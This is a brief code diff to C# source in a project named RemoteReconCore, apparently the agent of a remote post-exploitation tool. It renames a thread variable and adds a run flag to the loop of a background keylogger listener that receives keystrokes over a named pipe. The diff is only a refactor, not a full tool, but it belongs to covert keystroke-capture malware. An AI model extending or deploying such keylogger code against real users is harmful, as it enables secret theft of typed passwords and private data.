@@ -31,13 +31,13 @@ namespace RemoteReconCore
                 try
                 {
                     //Start the named pipe server and keylog listener in the background
-                    Agent.t = new Thread(() =>
+                    Agent.thr = new Thread(() =>
                     {
                         ReceiveKeyStrokes();
                     });
-                    Agent.t.SetApartmentState(ApartmentState.STA);
-                    Agent.t.IsBackground = true;
-                    Agent.t.Start();
+                    Agent.thr.SetApartmentState(ApartmentState.STA);
+                    Agent.thr.IsBackground = true;
+                    Agent.thr.Start();
 #if DEBUG
                     Console.WriteLine("Started background thread to sync keylogger");
 #endif
@@ -90,7 +90,7 @@ namespace RemoteReconCore
             Console.WriteLine("Received connection from client");
             Console.WriteLine("Starting loop");
 #endif
-            while(true)
+            while(Agent.keylogRun)
             {
                 
                 Thread.Sleep(1000);
